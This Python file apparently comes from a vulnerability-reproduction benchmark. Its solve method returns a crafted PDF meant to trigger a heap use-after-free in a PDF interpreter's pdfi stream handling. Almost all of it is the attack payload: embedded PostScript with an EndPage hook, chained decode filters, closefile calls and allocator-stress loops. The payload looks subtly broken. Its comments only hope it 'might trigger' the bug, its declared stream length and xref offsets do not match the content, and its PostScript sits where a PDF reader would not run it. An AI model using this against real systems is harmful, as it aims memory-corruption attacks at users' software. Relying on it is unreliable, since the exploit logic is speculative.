import os
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF with embedded PostScript that triggers the vulnerability
        # The vulnerability: pdfi context with no stream, but PDF operators still try to access it
        
        # Build a PDF that contains PostScript code that:
        # 1. Creates a pdfi context
        # 2. Fails to set the input stream from PostScript
        # 3. Then calls PDF operators that access the freed stream
        
        poc = b'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
>>
>>
endobj

4 0 obj
<<
/Length 13900
>>
stream
q
BT
/F1 12 Tf
100 700 Td
(Triggering Heap Use After Free) Tj
ET
Q

% PostScript code that will be executed
% This creates a situation where pdfi stream setup fails
% but PDF operators still try to use it

<<
/EndPage
{
    % Try to create a pdfi context with invalid stream
    /pdfdict 10 dict def
    pdfdict begin
    /pdfmark where {pop} {false} ifelse
    {
        % This will attempt to set pdfi stream but fail
        [ /_objdef {pdfstream} /type /stream /OBJ pdfmark
        [{ThisIsAnInvalidStreamThatWillCauseFailure}] pdfstream cvx exec
        
        % Now trigger operators that access the (now freed) stream
        currentdict /pdfstream known {
            pdfstream dup length 0 gt {
                % Try to access the stream - this should trigger UAF
                0 get
                pop
            } if
        } if
        
        % More stream access attempts
        currentfile
        /SubFileDecode filter
        /ASCII85Decode filter
        /FlateDecode filter
        dup closefile
        pop
        
        % Create circular references to confuse memory management
        /ref1 1 array def
        /ref2 1 array def
        ref1 0 ref2 put
        ref2 0 ref1 put
        
    } stopped {
        % Ignore errors, keep going
        pop pop
    } if
    end
} bind
>> setpagedevice

% Fill with more data to reach target size
% This increases chances of triggering the vulnerability
0 1 1000 {
    dup 0.5 mul sin
    exch pop
} for

% Create many objects to stress the allocator
100 array
dup 0 1000 put
dup 1 1000 put
dup 2 1000 put
dup 3 1000 put
dup 4 1000 put
dup 5 1000 put
dup 6 1000 put
dup 7 1000 put
dup 8 1000 put
dup 9 1000 put
pop

% More stream operations
currentfile
/RunLengthDecode filter
/DCTDecode filter
/CCITTFaxDecode filter
dup closefile
pop

% Create a pattern that might trigger the bug
<<
/PatternType 1
/PaintType 1
/TilingType 1
/BBox [0 0 100 100]
/XStep 100
/YStep 100
/PaintProc {
    pop
    % Access potentially freed resources
    currentfile token pop
    currentglobal true setglobal
    false setglobal
    currentshared false setshared
    true setshared
} bind
>> matrix makepattern setpattern

% Continue filling to reach exact size
0 1 5000 {
    dup dup mul
    exch pop
} for

endstream
endobj

xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000138 00000 n 
0000000254 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
14378
%%EOF'''

        return poc